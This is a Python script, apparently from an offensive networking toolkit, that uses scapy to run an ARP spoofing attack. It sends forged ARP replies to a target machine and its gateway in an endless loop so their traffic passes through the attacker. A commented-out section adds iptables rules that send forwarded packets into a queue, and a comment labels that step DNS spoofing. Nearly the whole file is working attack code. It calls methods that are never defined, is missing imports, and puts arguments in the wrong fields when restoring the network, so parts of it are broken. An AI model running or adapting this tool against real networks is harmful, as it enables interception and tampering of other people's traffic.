#!/usr/bin/env python3

from scapy.all import *
from threading import Thread
from colorama import init, Fore
from .banner import RED, RESET, BLUE, GREEN
import getpass

class spoofing:

    def __init__(self, target, host):
        self.target = target
        self.host = host

    
    def spoof(self, target, host, verbose=True):
        target_mac = getmac(target)
        arp = ARP(pdst=target, hwdst=target_mac, psrc=host, op="is-at")
        send(arp, verbose=0)
        if verbose:
            print(f"{GREEN}[+]{RESET} Send {GREEN}{target}{RESET} : {GREEN}{host} {RESET}is-at {GREEN}{self.my_mac}")
        time.sleep(1)
    
    def restore(self, target, host, verbose=True):
        target_mac = getmac(target)
        host_mac = getmac(host)
        arp = ARP(pdst=target, hwdst=host, psrc=target_mac, hwsrc=host_mac)
        send(arp, count=7, verbose=0)
        if verbose:
            print(f"{GREEN}[+]{RESET} Send {GREEN}{target}{RESET} : {GREEN}{host} {RESET}is-at {GREEN}{host_mac}")

    def run(self):
        self.check_root()
        self.ip_route()
        self.my_mac = ARP().hwsrc
        # print(self.target_mac, " ", self.host_mac, " ", self.my_mac)
        while True:
            self.spoof(self.target, self.host)
            self.spoof(self.host, self.target)


def getmac(ip):
	arp = ARP(pdst=ip)
	eth = Ether(dst="ff:ff:ff:ff:ff:ff")
	result = srp(eth/arp, timeout=3, verbose=0)[0]
	if result:
		return result[0][1].hwsrc

if __name__ == "__main__":
    a = spoofing("192.168.43.220", "192.168.43.1")
    try:
        a.run()
    except KeyboardInterrupt:
        print(f"[!] Detected Ctrl+C ! restoring Network ... please wait..")
        a.restore(a.target, a.host)
        a.restore(a.host, a.target)

# a = spoofing("192.168.100.4", "192.168.100.1")

# spoofer = Thread(target=a.run)
# spoofer.daemon = True
# try:
#     spoofer.start()
#     QUEUE_NUM = 0
#     os.system("iptables --flush")
#     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
#     queue = NetfilterQueue()
#     queue.bind(QUEUE_NUM, process_packet)
#     queue.run()
# except KeyboardInterrupt:
#     print(f"[!] Detected Ctrl+C ! restoring Network ... please wait..")
#     a.restore(a.target, a.host)
#     a.restore(a.host, a.target)
#     os.system("iptables --flush")
#     print("flush")
# # dns spoof